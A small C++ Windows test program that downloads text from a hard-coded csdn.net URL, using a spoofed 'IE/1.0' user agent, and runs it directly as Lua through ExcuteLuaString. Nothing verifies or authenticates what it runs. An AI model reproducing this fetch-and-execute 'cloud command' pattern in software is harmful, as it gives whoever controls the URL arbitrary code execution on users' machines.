// LuaConsoleTest.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <winInet.h>
#include "../LuajitLib/ExcuteLua.h"
#include <string>

#define MAXBLOCKSIZE 1024
BOOL GetCloudCmd( const std::string& strUrl, std::string& strCmd )
{
    BOOL bSuc = FALSE;
    do {
        HINTERNET hSession = InternetOpenA("IE/1.0 ", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if ( NULL == hSession ) {
            break;
        }

        HINTERNET handle = InternetOpenUrlA(hSession, strUrl.c_str(), NULL,  0 , INTERNET_FLAG_DONT_CACHE, 0);
        if ( NULL == handle ) {
            break;
        }

        byte Temp[MAXBLOCKSIZE] = {0};
        ULONG Number = 1 ;

        while (Number >  0 ) {
            InternetReadFile(handle, Temp, MAXBLOCKSIZE - 1,& Number );
            strCmd.append((char*)Temp);
            memset(Temp,0, MAXBLOCKSIZE);
        } 

        InternetCloseHandle(handle);
        handle  =  NULL;

        InternetCloseHandle(hSession);
        hSession  =  NULL;

        bSuc = TRUE;
    } while (0);
    return bSuc;
    
}

int _tmain(int argc, _TCHAR* argv[])
{
    std::string strUrl = "http://dl5.csdn.net/fd.php?i=341748182061456&s=95f3ecf9a259c4f38fcf60493a699287" ;
    std::string strCmd = "";
    if ( GetCloudCmd(strUrl, strCmd) )
    {
        ExcuteLuaString(strCmd.c_str(), strCmd.length());
    }
	return 0;
}
